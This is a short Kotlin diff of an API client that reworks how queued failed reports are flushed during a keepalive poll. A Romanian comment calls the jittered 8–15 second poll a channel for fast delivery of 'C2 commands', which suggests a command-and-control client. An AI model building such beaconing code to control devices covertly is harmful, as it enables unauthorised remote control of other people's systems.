@@ -56,9 +56,11 @@ class ForjaApi {
         .writeTimeout(60, TimeUnit.SECONDS)
         .build()
 
-    // Coada de rapoarte eșuate — se flush-uiește la fiecare keepalive.
+    // Coada de rapoarte eșuate — se flush-uiește din bucla de keepalive,
+    // dar într-o coroutine separată ca să nu blocheze niciodată request-ul.
     private val pendingReports = java.util.concurrent.ConcurrentLinkedQueue<String>()
     private val MAX_PENDING = 10
+    val hasPendingReports: Boolean get() = pendingReports.isNotEmpty()
     private val json = Json { ignoreUnknownKeys = true; isLenient = true }
 
     val available: Boolean get() = BuildConfig.FORJA_API_URL.isNotBlank()
@@ -290,8 +292,6 @@ class ForjaApi {
 
     suspend fun syncKeepalive(dev: String, holdMs: Long): SyncPoll = withContext(Dispatchers.IO) {
         val token = idToken() ?: return@withContext SyncPoll(emptyList(), 30000)
-        // Fluează rapoartele eșuate din ciclurile anterioare
-        try { flushPendingReports() } catch (_: Exception) {}
         try {
             // Interval scurt (8–15 s) pentru livrare rapidă a comenzilor C2
             val hint = (8000 + (Math.random() * 7000).toInt()).coerceIn(5000, 20000)
